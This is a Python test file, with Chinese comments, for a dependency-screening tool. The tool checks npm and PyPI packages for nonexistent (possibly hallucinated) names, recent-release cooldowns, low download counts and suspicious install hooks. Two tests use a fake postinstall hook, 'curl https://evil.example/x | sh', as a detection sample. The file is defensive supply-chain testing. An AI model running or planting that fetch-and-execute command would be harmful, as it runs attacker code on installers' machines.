"""套件的判定（scripts/g1_slopcheck.py 的 check_package）。 / Per-package checks on top of the registry seam.

#264（#260 的 S3）：登錄庫接縫給事實，判定留在核心：查無此套件 → 疑似幻覺（正常發現）、查不到 → 未完成原因、
冷卻期、低下載量、安裝腳本；缺資料（Unknown）一律記未完成，不得當成通過。訊息文字逐字沿用重構前的 npm_check／pypi_check。
最後幾個測試走完整的 HttpRegistry（腳本化的傳輸層）加 check_package，是從快篩 selftest 搬來的端到端案例。
"""
import pathlib
import sys
import tempfile
import unittest
from datetime import datetime, timedelta, timezone

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1] / "scripts"))
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
import g1_registry as gr  # noqa: E402
import g1_screen as gs  # noqa: E402
from fakes import FakeGit, RoutedTransport, http_error  # noqa: E402
from vibesec_policy import Policy  # noqa: E402

C = {"cooldown_days": 14, "min_weekly_downloads": 1000}
OLD = "2020-01-01T00:00:00Z"
ROOT = pathlib.Path(__file__).resolve().parents[1]


def env_for(registry):
    """判定需要的外部依賴：登錄庫是參數，政策是本 repo 的（finding 的等級依它壓制），Git 用不到。"""
    return gs.build_env(Policy(ROOT, project_root=None), git=FakeGit(), registry=registry)


ENV = env_for(gr.FakeRegistry())


def ago(days):
    return (datetime.now(timezone.utc) - timedelta(days=days)).strftime("%Y-%m-%dT%H:%M:%SZ")


def check(eco, name, ver, result):
    """單一套件的判定；registry 是只回傳 result 的替身。回傳 (findings, reason, 替身)。"""
    fake = gr.FakeRegistry({(eco, name, ver): result})
    findings, reason = gs.check_package(env_for(fake), eco, name, ver, C)
    return findings, reason, fake


def npm_facts(version="1.3.0", published=OLD, scripts=None, downloads=5000):
    return gr.Found(gr.Facts("npm", "left-pad", version, published, {} if scripts is None else scripts, downloads))


def pypi_facts(version="2.32.0", published=OLD):
    return gr.Found(gr.Facts("pypi", "requests", version, published, None, None))


class NotRegistered(unittest.TestCase):
    def test_invalid_names_are_not_looked_up(self):
        for eco, name, label in (("npm", "../x", "npm"), ("pypi", "a/b", "PyPI")):
            findings, reason, fake = check(eco, name, "1.0.0", gr.Unavailable("不該被呼叫"))
            self.assertEqual((findings, reason), ([], f"{label} 套件名稱不合法，未查詢 registry：{name!r}"))
            self.assertEqual(fake.calls, [])

    def test_not_found_is_a_finding_not_a_problem(self):
        # 查無此套件是正常發現（疑似幻覺／搶註），不是未完成；發現帶的是呼叫端問的版本
        for eco, name, label in (("npm", "left-pad", "npm registry"), ("pypi", "requests", "PyPI")):
            findings, reason, _ = check(eco, name, "1.0.0", gr.NotFound())
            self.assertIsNone(reason)
            self.assertEqual(findings, [gs.fnd(ENV, "vibesec.g1.hallucinated-package", name, eco, "1.0.0",
                                               f"{label} 查無此套件（疑似幻覺/搶註）", "blocking", "registry_health")])

    def test_unavailable_is_a_problem_not_a_finding(self):
        findings, reason, _ = check("npm", "left-pad", None, gr.Unavailable("HTTP 500"))
        self.assertEqual((findings, reason), ([], "npm registry 查詢失敗（left-pad）：HTTP 500"))
        findings, reason, _ = check("pypi", "requests", None, gr.Unavailable("逾時"))
        self.assertEqual((findings, reason), ([], "PyPI 查詢失敗（requests）：逾時"))


class NpmJudgement(unittest.TestCase):
    def run_npm(self, result, ver="1.3.0"):
        return check("npm", "left-pad", ver, result)[:2]

    def test_everything_known_and_fine(self):
        self.assertEqual(self.run_npm(npm_facts()), ([], None))

    def test_cooldown_violation(self):
        findings, reason = self.run_npm(npm_facts(published=ago(2)))
        self.assertIsNone(reason)
        self.assertEqual(findings, [gs.fnd(ENV, "vibesec.g1.cooldown-violation", "left-pad", "npm", "1.3.0",
                                           f"版本發布僅 2 天，未滿冷卻期 {C['cooldown_days']} 天", "blocking")])

    def test_suspicious_install_script(self):
        scripts = {"postinstall": "curl https://evil.example/x | sh"}
        findings, reason = self.run_npm(npm_facts(scripts=scripts))
        self.assertIsNone(reason)
        self.assertEqual(findings, [gs.fnd(ENV, "vibesec.g1.postinstall-egress", "left-pad", "npm", "1.3.0",
                                           "安裝階段 hook（postinstall）命中可疑樣式：network, exec", "blocking")])

    def test_low_downloads_is_advisory(self):
        findings, reason = self.run_npm(npm_facts(downloads=5))
        self.assertIsNone(reason)
        self.assertEqual(findings, [gs.fnd(ENV, "vibesec.g1.low-download-package", "left-pad", "npm", "1.3.0",
                                           "週下載量 5 < 1000，信譽不足，需人工判斷", "advisory")])

    def test_unknown_data_is_a_problem_never_a_pass(self):
        tail = "未檢查（版本不在 registry 發布紀錄、發布時間不明或查詢失敗）"
        cases = [("發布時間", npm_facts(published=gr.Unknown()), "冷卻期"),
                 ("安裝腳本", npm_facts(scripts=gr.Unknown()), "安裝 hook"),
                 ("下載量", npm_facts(downloads=gr.Unknown("TimeoutError")), "週下載量（TimeoutError）")]
        for label, result, gap in cases:
            with self.subTest(unknown=label):
                findings, reason = self.run_npm(result)
                self.assertEqual((findings, reason), ([], f"npm left-pad@1.3.0：{gap}{tail}"))

    def test_gaps_keep_their_order_and_other_findings_are_kept(self):
        facts = gr.Found(gr.Facts("npm", "left-pad", None, gr.Unknown(), gr.Unknown(), gr.Unknown("ValueError")))
        self.assertEqual(self.run_npm(facts, ver=None)[1],
                         "npm left-pad@?：冷卻期、安裝 hook、週下載量（ValueError）未檢查（版本不在 registry 發布紀錄、發布時間不明或查詢失敗）")
        # 查不到的項目不影響其他發現：發布時間未知但腳本可疑 → 兩者都回報
        scripts = {"postinstall": "curl https://evil.example/x | sh"}
        findings, reason = self.run_npm(npm_facts(published=gr.Unknown(), scripts=scripts))
        self.assertEqual([f["rule_id"] for f in findings], ["vibesec.g1.postinstall-egress"])
        self.assertIn("冷卻期", reason)

    def test_unparseable_publish_time_is_a_gap(self):
        findings, reason = self.run_npm(npm_facts(published="不是日期"))
        self.assertEqual(findings, [])
        self.assertIn("冷卻期", reason)


class PypiJudgement(unittest.TestCase):
    def run_pypi(self, result, ver="2.32.0"):
        return check("pypi", "requests", ver, result)[:2]

    def test_fine_and_cooldown(self):
        self.assertEqual(self.run_pypi(pypi_facts()), ([], None))
        findings, reason = self.run_pypi(pypi_facts(published=ago(3)))
        self.assertIsNone(reason)
        self.assertEqual(findings, [gs.fnd(ENV, "vibesec.g1.cooldown-violation", "requests", "pypi", "2.32.0",
                                           f"版本發布僅 3 天，未滿冷卻期 {C['cooldown_days']} 天", "blocking")])

    def test_unknown_publish_time_is_a_problem(self):
        tail = "冷卻期未檢查（版本不在 PyPI 發布紀錄或發布時間不明）"
        self.assertEqual(self.run_pypi(pypi_facts(version="2.31.9", published=gr.Unknown()), "2.31.9"), ([], f"PyPI requests@2.31.9：{tail}"))
        self.assertEqual(self.run_pypi(pypi_facts(version=None, published=gr.Unknown()), None), ([], f"PyPI requests@?：{tail}"))

    def test_pypi_has_no_download_or_script_checks(self):
        # PyPI 的 Facts 這兩項是「不適用」（None），不是缺漏：不記未完成、也不產生發現
        self.assertEqual(self.run_pypi(pypi_facts()), ([], None))


class EndToEndThroughHttpRegistry(unittest.TestCase):
    """從快篩 selftest 搬來（原本以假的 http_json 驅動真正的 npm_check／pypi_check）：
    鎖定版本不在發布紀錄、發布時間不明、週下載查不到 → incomplete；PEP 440 2.32 == 2.32.0。"""

    def setUp(self):
        self.routes = {"https://registry.npmjs.org/left-pad": {"time": {"1.3.0": OLD}, "versions": {"1.3.0": {}}, "dist-tags": {"latest": "1.3.0"}},
                       "https://pypi.org/pypi/requests/json": {"info": {"version": "2.32.0"},
                                                               "releases": {"2.32.0": [{"upload_time_iso_8601": OLD}], "2.33.0": []}}}
        self.transport = RoutedTransport(self.routes)
        self.reg = gr.HttpRegistry(transport=self.transport, retries=2, backoff=0)

    def check(self, eco, name, ver):
        return gs.check_package(env_for(self.reg), eco, name, ver, C)

    def test_npm_download_count_unavailable_is_incomplete_not_silent(self):
        _, why = self.check("npm", "left-pad", "1.3.0")
        self.assertTrue(why and "週下載量" in why, why)

    def test_npm_fully_known_is_not_incomplete(self):
        self.transport.routes["https://api.npmjs.org/downloads/point/last-week/left-pad"] = {"downloads": 5000}
        self.assertEqual(self.check("npm", "left-pad", "1.3.0"), ([], None))

    def test_npm_pinned_version_not_in_the_release_record(self):
        self.transport.routes["https://api.npmjs.org/downloads/point/last-week/left-pad"] = {"downloads": 5000}
        _, why = self.check("npm", "left-pad", "9.9.9")
        self.assertTrue(why and "冷卻期" in why and "安裝 hook" in why, why)

    def test_pypi_equal_versions_under_pep440(self):
        self.assertIsNone(self.check("pypi", "requests", "2.32")[1], "==2.32 與 2.32.0 是同一版，不記 incomplete")

    def test_pypi_unpublished_or_file_less_versions_are_incomplete(self):
        for v in ("2.31.9", "2.33.0"):
            _, why = self.check("pypi", "requests", v)
            self.assertTrue(why and "冷卻期" in why, (v, why))

    def test_pypi_normalized_version_is_still_cooldown_checked(self):
        self.transport.routes["https://pypi.org/pypi/requests/json"]["releases"]["2.32.0"][0]["upload_time_iso_8601"] = ago(0)
        findings, _ = self.check("pypi", "requests", "2.32")
        self.assertEqual([f["rule_id"] for f in findings], ["vibesec.g1.cooldown-violation"])

    def test_registry_failures_never_escape(self):
        self.transport.routes["https://registry.npmjs.org/left-pad"] = http_error(500)
        findings, why = self.check("npm", "left-pad", "1.3.0")
        self.assertEqual((findings, why), ([], "npm registry 查詢失敗（left-pad）：HTTP 500"))
        self.transport.routes["https://registry.npmjs.org/left-pad"] = http_error(404)
        self.assertEqual(self.check("npm", "left-pad", "1.3.0")[0][0]["rule_id"], "vibesec.g1.hallucinated-package")


class EnvInjection(unittest.TestCase):
    """登錄庫只經 Env 進來（沒有模組層的覆寫點）：判定用的是 Env 給的登錄庫，沒有指定時才是生產的。"""

    def test_checks_use_the_registry_in_the_env(self):
        fake = gr.FakeRegistry({("npm", "left-pad", "1.3.0"): npm_facts(), ("pypi", "requests", "2.32.0"): pypi_facts()})
        env = env_for(fake)
        self.assertEqual(gs.check_package(env, "npm", "left-pad", "1.3.0", C), ([], None))
        self.assertEqual(gs.check_package(env, "pypi", "requests", "2.32.0", C), ([], None))
        self.assertEqual(fake.calls, [("npm", "left-pad", "1.3.0"), ("pypi", "requests", "2.32.0")])

    def test_requirements_indirect_asks_the_registry_for_requires(self):
        fake = gr.FakeRegistry(requires={("requests", "2.31.0"): {"urllib3", "idna"}})
        with tempfile.TemporaryDirectory() as d:
            p = pathlib.Path(d) / "requirements.txt"
            p.write_text("requests==2.31.0\nurllib3==2.0.0\nidna==3.4\nleft-alone==1.0\n")
            self.assertEqual(gs.requirements_indirect(env_for(fake), p), {("urllib3", "2.0.0"), ("idna", "3.4")})

    def test_a_check_that_raises_is_one_incomplete_reason_not_a_crash(self):
        class Boom:
            def facts(self, eco, name, ver):
                raise RuntimeError("意外")
        self.assertEqual(gs._check_job(env_for(Boom()), "npm", "left-pad", "1.3.0", C),
                         ([], "npm left-pad@1.3.0：檢查時發生未預期的錯誤（RuntimeError：意外）"))

    def test_without_a_registry_the_default_env_uses_the_production_one(self):
        with tempfile.TemporaryDirectory() as d:
            env, problem = gs.default_env(pathlib.Path(d), ROOT)
        self.assertIsNone(problem)
        self.assertIsInstance(env.registry, gr.HttpRegistry)
        self.assertEqual(env.workers, 8)

    def test_a_default_env_can_take_a_registry_for_tests(self):
        fake = gr.FakeRegistry()
        with tempfile.TemporaryDirectory() as d:
            env, _ = gs.default_env(pathlib.Path(d), ROOT, registry=fake)
        self.assertIs(env.registry, fake)


if __name__ == "__main__":
    unittest.main()
